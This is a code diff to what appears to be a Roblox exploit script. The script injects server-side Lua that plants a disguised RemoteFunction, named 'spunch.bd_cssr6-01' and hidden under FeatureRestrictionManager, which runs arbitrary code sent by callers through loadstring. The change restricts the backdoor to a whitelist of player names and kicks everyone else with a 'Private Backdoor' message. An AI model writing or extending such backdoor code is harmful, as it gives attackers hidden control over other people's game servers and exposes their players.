@@ -2471,17 +2471,25 @@ fireRemoteEvent([[
 	  end
 end]])
 
+local whitelistString = "{"
+for _, name in ipairs(whitelisted) do
+    whitelistString = whitelistString .. '["' .. name .. '"] = true, '
+end
+whitelistString = whitelistString .. "}"
+
 fireRemoteEvent([[
 	local frm = game:GetService("FeatureRestrictionManager")
 	
 	local remoteFunction = Instance.new("RemoteFunction")
 	remoteFunction.Name = "spunch.bd_cssr6-01"
 	remoteFunction.Parent = frm
-	
+
+    local whitelist = ]] .. whitelistString .. [[
+
 	local loadstring = require(5612987995)
 	
 	remoteFunction.OnServerInvoke = function(player, code)
-	    if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
+	    if not whitelist[player.Name] then
 	        player:Kick("Backdoor has been secured by Patruck - Private Backdoor.")
 	    end
 	    loadstring(code)()
